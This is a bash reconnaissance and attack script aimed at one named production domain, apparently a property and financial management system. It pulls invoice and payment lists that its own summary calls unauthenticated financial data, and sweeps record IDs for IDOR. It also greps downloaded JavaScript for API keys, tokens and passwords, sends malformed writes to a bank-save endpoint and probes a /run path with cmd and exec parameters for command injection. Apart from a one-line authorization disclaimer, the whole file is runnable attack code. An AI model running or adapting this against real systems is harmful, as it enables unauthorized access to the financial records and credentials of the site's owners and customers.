#!/usr/bin/env bash
# ezen-recon6.sh — read-only recon for ezen.tysons.co.ke
# Steps 1-8. Safe by default: no writes, no brute force.
# Usage: ./ezen-recon6.sh
#
# Scope: read-only enumeration + 2 invalid-body probes + 1 dummy login.
# Do NOT run without written authorization on the target.

set -u
BASE="https://ezen.tysons.co.ke"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
OUT="ezen-recon6-$(date +%Y%m%d-%H%M%S)"
DELAY=0.3

mkdir -p "$OUT"
cd "$OUT" || exit 1

# curl: silent, follow redirects, insecure (self-signed OK), UA, timeout, delay
C() { curl -sS -L -k -A "$UA" -m 30 "$@"; }
# curl with throttle between requests
CS() { sleep "$DELAY"; curl -sS -L -k -A "$UA" -m 30 "$@"; }

hr() { printf '\n===== %s =====\n' "$1"; }

# ------------------------------------------------------------------
hr "1. Pull invoices/list and payments/list"

for r in invoices payments; do
  echo "--- /live/api/$r/list ---"
  CS -o "$r-list.json" -w 'HTTP:%{http_code}  size:%{size_download}  type:%{content_type}\n' \
    "$BASE/live/api/$r/list"
  if [ -s "$r-list.json" ]; then
    echo "--- head ---"
    head -c 2000 "$r-list.json"; echo
    if command -v jq >/dev/null; then
      echo "--- keys / count ---"
      jq -r 'if type=="object" then (keys|join(",")) else "array(len="+(length|tostring)+")" end' \
        "$r-list.json" 2>/dev/null
    fi
  fi
  echo
done

# ------------------------------------------------------------------
hr "2. IDOR sweep on invoices + payments load/{id}"

for r in invoices payments; do
  echo "--- /live/api/$r/load/{id} ---"
  for id in 1 2 3 100 500 1000 5000 10000 50000 100000; do
    code=$(CS -o "/tmp/idor_${r}_${id}.json" -w '%{http_code}' \
      "$BASE/live/api/$r/load/$id")
    printf '  %-6s %s\n' "$code" "$id"
    if [ "$code" = "200" ]; then
      head -c 300 "/tmp/idor_${r}_${id}.json"; echo
    fi
  done
  echo
done

# also probe sub-resources on each
echo "--- sub-resource discovery ---"
for r in invoices payments; do
  for sub in load save count search list; do
    code=$(CS -o /dev/null -w '%{http_code}' "$BASE/live/api/$r/$sub")
    echo "  $code  /live/api/$r/$sub"
  done
done

# ------------------------------------------------------------------
hr "3. /banks/list with high limit"

CS -o banks-list-full.json -w 'HTTP:%{http_code}  size:%{size_download}\n' \
  "$BASE/live/api/banks/list?start=0&limit=10000"
if command -v jq >/dev/null; then
  echo "count: $(jq -r '.count' banks-list-full.json 2>/dev/null)"
  echo "list length: $(jq -r '.list|length' banks-list-full.json 2>/dev/null)"
else
  grep -oE '"count":[0-9]+' banks-list-full.json
fi

# ------------------------------------------------------------------
hr "4. Fetch client-side JS assets"

for f in app/config.js app/store.js app/ext-custom-cmp.js \
         js/App.js js/Desktop.js js/Module.js js/StartMenu.js js/TaskBar.js \
         sample.js app/property/property.js app/accounts/accounts.js app/hrm/hrm.js; do
  safe=$(echo "$f" | tr '/' '_')
  CS -o "js_$safe" -w "HTTP:%{http_code}  size:%{size_download}  $f\n" \
    "$BASE/$f"
done

echo "--- grep for secrets / endpoints across downloaded JS ---"
grep -rInE 'api[_-]?key|token|secret|passw|authorization|bearer|/live/api|sal\.tp' \
  js_* 2>/dev/null | head -80 | tee js-secrets.txt

# ------------------------------------------------------------------
hr "5. Dummy login POST to /login?sal.tp=login"

CS -i -X POST "$BASE/login?sal.tp=login" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'userAuthentication.username=test&userAuthentication.password=test' \
  -o login-response.txt
head -40 login-response.txt

# ------------------------------------------------------------------
hr "6. Invalid-body probes on /banks/save (NO valid writes)"

echo "--- probe A: missing required fields, bad id type ---"
CS -i -X POST "$BASE/live/api/banks/save" \
  -H 'Content-Type: application/json' \
  -d '{"id":"__INVALID__"}' -o save-probeA.txt
head -25 save-probeA.txt

echo "--- probe B: type-mismatch payload ---"
CS -i -X POST "$BASE/live/api/banks/save" \
  -H 'Content-Type: application/json' \
  -d '{"id":"not-a-number","name":123,"code":456}' -o save-probeB.txt
head -25 save-probeB.txt

echo
echo "[!] If either probe returned HTTP 200 with a recordId, STOP and report."
echo "    A 200 here = unauthenticated write on a production FMS."

# ------------------------------------------------------------------
hr "7. /run parameter hashing"

echo "--- /run?<p>=id md5 comparison ---"
for p in cmd command exec run script file action method; do
  md5=$(CS "$BASE/run?$p=id" | md5sum | awk '{print $1}')
  printf '  %-10s %s\n' "$p" "$md5"
done
echo "--- baselines ---"
printf '  %-10s %s\n' "(no query)" "$(CS "$BASE/run" | md5sum | awk '{print $1}')"
printf '  %-10s %s\n' "404-path"   "$(CS "$BASE/this-does-not-exist-9f3a2b" | md5sum | awk '{print $1}')"
printf '  %-10s %s\n' "index"      "$(CS "$BASE/index.html" | md5sum | awk '{print $1}')"
printf '  %-10s %s\n' ";/admin"    "$(CS "$BASE/;/admin" | md5sum | awk '{print $1}')"

# ------------------------------------------------------------------
hr "8. Re-fetch /ajax/landlord.html (no head)"

CS -o ajax-landlord.html -w 'HTTP:%{http_code}  size:%{size_download}  type:%{content_type}\n' \
  "$BASE/ajax/landlord.html"
head -c 500 ajax-landlord.html 2>/dev/null; echo

# also try a couple of other ajax paths
for p in property tenant accounts invoices; do
  CS -o "ajax-$p.html" -w "HTTP:%{http_code}  size:%{size_download}  /ajax/$p.html\n" \
    "$BASE/ajax/$p.html"
done

# ------------------------------------------------------------------
hr "SUMMARY"
echo "Output dir: $(pwd)"
ls -la
echo
echo "Key artifacts:"
echo "  invoices-list.json / payments-list.json  — unauth financial data"
echo "  banks-list-full.json                     — high-limit bank list"
echo "  js_*                                     — client JS assets"
echo "  js-secrets.txt                           — secret/endpoint grep hits"
echo "  login-response.txt                       — dummy login attempt"
echo "  save-probeA.txt / save-probeB.txt        — /banks/save validation probes"
echo "  ajax-*.html                              — ajax endpoint bodies"
echo
echo "Quick checks:"
echo "  jq '.count' banks-list-full.json"
echo "  jq '.' invoices-list.json | head -50"
echo "  jq '.' payments-list.json | head -50"
echo "  cat js-secrets.txt"
